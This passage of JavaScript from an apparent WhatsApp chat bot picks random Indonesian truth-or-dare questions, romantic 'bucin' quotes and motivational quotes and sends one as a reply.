    "Kapan terakhir kali kamu sangat marah? Mengapa?",
    "Siapa orang terakhir yang meneleponmu?",
    "Apakah kamu memiliki bakat tersembunyi? Apa sajakah itu?",
    "Kata apa yang paling kamu benci?",
    "Video YouTube terakhir apa yang kamu tonton?",
    "Hal terakhir apa yang kamu cari di Google?",
    "Dalam grup ini, dengan siapa yang ingin kamu tukar kehidupan selama seminggu?",
    "Apa hal paling menakutkan yang pernah terjadi padamu?",
    "Pernahkah kamu kentut dan menyalahkannya kepada orang lain?",
    "Kapan terakhir kali kamu membuat orang lain menangis?",
    "Pernahkah kamu menghilangkan jejak dari seorang teman?",
    "Pernahkah kamu melihat mayat?",
    "Anggota keluargamu yang paling mengganggumu dan mengapa?",
    "Jika kamu harus menghapus satu aplikasi dari ponselmu, aplikasi mana yang akan kamu hapus?",
    "Aplikasi apa yang paling sering kamu buang-buang waktu di dalamnya?",
    "Pernahkah kamu berpura-pura sakit untuk pulang dari sekolah?",
    "Apa barang paling memalukan di dalam kamar kamarmu?",
    "Jika terdampar di pulau terpencil, lima barang apa yang akan kamu bawa?",
    "Pernahkah kamu tertawa begitu keras hingga pipismu basah?",
    "Apakah kamu mencium bau kentutmu sendiri?",
    "Pernahkah kamu kencing di tempat tidur saat tidur?",
    "Apa kesalahan terbesar yang pernah kamu buat?",
    "Pernahkah kamu mencontek dalam ujian?",
    "Apa hal terburuk yang pernah kamu lakukan?",
    "Kapan terakhir kali kamu menangis?",
    "Di antara orang tua kamu, siapa yang kamu cintai paling?",
    "Apakah kamu kadang-kadang memasukkan jari ke dalam lubang hidungmu?",
    "Siapa pujaan hati kamu saat masa sekolah dulu?",
    "Berbicara jujur, apakah kamu menyukai seorang anak laki-laki dalam grup ini?",
    "Pernahkah kamu menyukai seseorang? Berapa lama?",
    "Apakah kamu punya pacar? Apa ketakutan terbesarmu?",
    "Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang pernah kamu sukai diam-diam?",
    "Pernahkah kamu mengambil uang milik ibu atau ayahmu? Apa alasannya?",
    "Apa yang membuatmu bahagia saat sedang sedih?",
    "Apakah kamu menyukai seseorang dalam grup ini? Jika ya, siapa?",
    "Pernahkah kamu ditipu oleh seseorang?",
    "Siapa orang yang paling penting dalam hidupmu?",
    "Prestasi apa yang telah kamu capai tahun ini?",
    "Siapa orang yang bisa membuatmu bahagia saat sedang sedih?",
    "Siapa orang yang pernah membuatmu merasa tidak nyaman?",
    "Pernahkah kamu berbohong kepada orang tua?",
    "Apakah kamu masih menyukai mantan pacarmu?",
    "Siapa yang ingin kamu ajak bermain bersama?",
    "Pernahkah kamu mencuri sesuatu yang besar? Alasannya apa?",
    "Sebutkan insiden yang pernah membuatmu terluka dan masih kamu ingat?",
    "Prestasi apa yang sudah kamu raih tahun ini?",
    "Apa kebiasaan terburukmu saat di sekolah?",
    "Apakah kamu mencintai pencipta bot ini, Dani 😄",
    "Pernahkah kamu berpikir untuk membalas dendam pada guru?",
    "Apakah kamu menyukai perdana menteri saat ini di negaramu?",
    "Apakah kamu vegetarian atau non-vegetarian?",
    "Jika kamu bisa menjadi tak terlihat, apa yang pertama kali akan kamu lakukan?",
    "Apa rahasia yang kamu simpan dari orang tua kamu?",
    "Siapa pujaan hati rahasiamu?",
    "Siapa orang terakhir yang kamu intip di media sosial?",
    "Jika seorang jin memberimu tiga permintaan, apa yang akan kamu minta?",
    "Apa penyesalan terbesarmu?",
    "Hewan seperti apa menurutmu yang paling mirip denganmu?",
    "Berapa banyak foto selfie yang kamu ambil dalam sehari?",
    "Apa acara favoritmu saat masa kanak-kanak?",
    "Jika kamu bisa menjadi karakter fiksi dalam satu hari, siapa yang akan kamu pilih?",
    "Dengan siapa kamu paling sering mengirim pesan?",
    "Apa kebohongan terbesar yang pernah kamu ceritakan kepada orang tua kamu?",
    "Siapa selebriti yang menjadi pujaan hatimu?",
    "Mimpi paling aneh yang pernah kamu alami?",
    "Apakah kamu bermain PUBG? Jika ya, berikan nomor ID-mu."
]
              const Nanotruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              rxhl.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Nanotruth }, {quoted:m})
              break
//quotesbucin
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const Nanotruth = bucin[Math.floor(Math.random() * bucin.length)]
	replyz(Nanotruth)
}
break

//=========================================\\======
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
